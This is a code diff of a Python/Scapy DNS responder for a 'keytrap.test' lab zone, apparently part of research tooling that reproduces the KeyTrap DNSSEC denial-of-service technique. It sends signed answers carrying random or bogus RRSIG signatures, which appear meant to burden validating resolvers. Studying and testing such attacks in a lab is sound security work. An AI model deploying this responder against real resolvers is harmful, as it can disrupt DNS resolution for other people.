@@ -5,13 +5,13 @@ from datetime import datetime
 import base64
 
 # 配置DNS服务器的IP和端口
-SERVER_IP = "10.10.0.3" # DNS服务器的IP会被用于DNSSEC签名，更换IP需要重新生成全部签名。
+SERVER_IP = "10.10.2.3" # DNS服务器的IP会被用于DNSSEC签名，更换IP需要重新生成全部签名。
 PORT_OF_SERVER = "53"
 DOMAIN_NAME = [
     "www.keytrap.test.", 
     "keytrap.test.", 
     "ns1.keytrap.test.", 
-    "cname.keytrap.test.",
+
     # 似乎是用来更新Trust Anchor的域名，具体机制有待探究...
     "_ta-75b2.keytrap.test.",
 ]
@@ -24,7 +24,7 @@ GLOBAL_TTL = 86400
 INCEPTION = datetime.strptime("20241007092918", "%Y%m%d%H%M%S").timestamp()
 EXPIRATION = datetime.strptime("20241106092918", "%Y%m%d%H%M%S").timestamp()
 RRSIG={
-    "www.keytrap.test." : base64.b64decode("XBHOlljD4lBFpWFmbe2sXNhEbnDaDPBMn2e1Pvw0AIt3NW9j92zP4GHGCVI3IS1Ea3uGq0nBcUHVet5hxsXmhkoeLzIuDtU8Va4O2LyFIdX5Km1lpdntwcr0OOIAmAN5"),
+    "www.keytrap.test." : base64.b64decode("1111"),
     # RRSIG FOR NS
     "keytrap.test."     : base64.b64decode("Kb3NEkEkeBuxcpIsRTrBx7QPRk+LQN75ExRKzyiCAkgpz4k7+0lCMKyRcEWGQ6Ow28IFK+FV+lkdRr4uVxsjpVmc5ZtTJjFEfNVv3UCyHufrX4lvneIUYfls6zTR5RBq"),
     "ns1.keytrap.test." : base64.b64decode("14I5St5PVzzL4ucb2yTWq3BSOGAXfJCLH4/De2HMm3sKznFf+RCAtv3lF1fpJyLDsXi4db8cf96nn2RPhQNM9T6p3HFITSJs4P5GRTkGmJJlafMlCHIOo1Lfv1aLEf5h"),
@@ -34,8 +34,7 @@ RRSIG={
 
 # DNS记录的RDATA
 RRRDATA={
-    "www.keytrap.test.": "cname.keytrap.test.",
-    "cname.keytrap.test.": SERVER_IP,
+    "www.keytrap.test.": SERVER_IP,
     "keytrap.test.": "ns1.keytrap.test.",
     "ns1.keytrap.test.": SERVER_IP,
 }
@@ -49,6 +48,7 @@ DNSKEY={
     "ZSK": base64.b64decode("DcYreAh+USsK1mtv7bSR2iaQvShPUqCy7l/BRQXttAFupXp6pUaQZS+k ii+H2JJqd+rS4YgC3KCd/by8yQi5j+WSy2yRprSuFuDyqZMFnDT/Py+n GjmIa59+W1iMdEYb"),
 }
     
+
 def gen_random_rrsig(len=96):
     return os.urandom(len)
 
@@ -59,28 +59,12 @@ def craft_dns_response(pkt, qname, qtype):
     # 查询A记录
     if qtype == 1:
         reply_pkt /= DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, qd=pkt[DNS].qd,
-                        ancount=4,
+                        ancount=2,
                         an=
-                            DNSRR(rrname=qname, type=5, ttl=GLOBAL_TTL, rdata=RRRDATA["www.keytrap.test."]) /
-                            DNSRRRSIG(rrname=qname, labels=3, ttl=GLOBAL_TTL, typecovered=5, originalttl=GLOBAL_TTL, 
+                            DNSRR(rrname=qname, type=1, ttl=GLOBAL_TTL, rdata=RRRDATA["www.keytrap.test."]) /
+                            DNSRRRSIG(rrname=qname, labels=3, ttl=GLOBAL_TTL, typecovered=1, originalttl=GLOBAL_TTL, 
                             expiration=EXPIRATION, inception=INCEPTION,keytag=6350, algorithm=14, 
-                            signersname="keytrap.test", signature=gen_random_rrsig()) /
-                            DNSRR(rrname="cname.keytrap.test.", type=1, ttl=GLOBAL_TTL, rdata=RRRDATA["cname.keytrap.test."]) /
-                            DNSRRRSIG(rrname="cname.keytrap.test.", labels=3, ttl=GLOBAL_TTL, typecovered=1, originalttl=GLOBAL_TTL,
-                            expiration=EXPIRATION, inception=INCEPTION, keytag=6350, algorithm=14,
-                            signersname="keytrap.test", signature=gen_random_rrsig()),
-                        nscount=2,
-                        ns=
-                            DNSRR(rrname="keytrap.test.", type=2, ttl=GLOBAL_TTL, rdata=RRRDATA["keytrap.test."]) /
-                            DNSRRRSIG(rrname="keytrap.test.", labels=2, ttl=GLOBAL_TTL, typecovered=2, originalttl=GLOBAL_TTL,
-                             expiration=EXPIRATION, inception=INCEPTION, keytag=6350, algorithm=14, 
-                             signersname="keytrap.test", signature=RRSIG["keytrap.test."]),
-                        arcount=2,
-                        ar=
-                            DNSRR(rrname="ns1.keytrap.test.", type=1, ttl=GLOBAL_TTL, rdata=RRRDATA["ns1.keytrap.test."]) /
-                            DNSRRRSIG(rrname="ns1.keytrap.test.", labels=3, ttl=GLOBAL_TTL, typecovered=1, originalttl=GLOBAL_TTL, 
-                            expiration=EXPIRATION, inception=INCEPTION,keytag=6350, algorithm=14, 
-                            signersname="keytrap.test", signature=RRSIG["ns1.keytrap.test."]),
+                            signersname="keytrap.test", signature=RRSIG["www.keytrap.test."]),
                     )
 
     # 查询DNSKEY记录
@@ -116,7 +100,7 @@ def dns_response(pkt):
             return
         
         # 在Docker容器环境中，会莫名出现来自本机的无限迭代的DNS请求；
-        # 无限迭代会阻塞Scapy权威的允许，这里通过过滤本机IP地址，避免无限迭代。
+        # 无限迭代会阻塞Scapy权威的运行，这里通过过滤本机IP地址，避免无限迭代。
         if pkt[IP].src == SERVER_IP:
             return
 
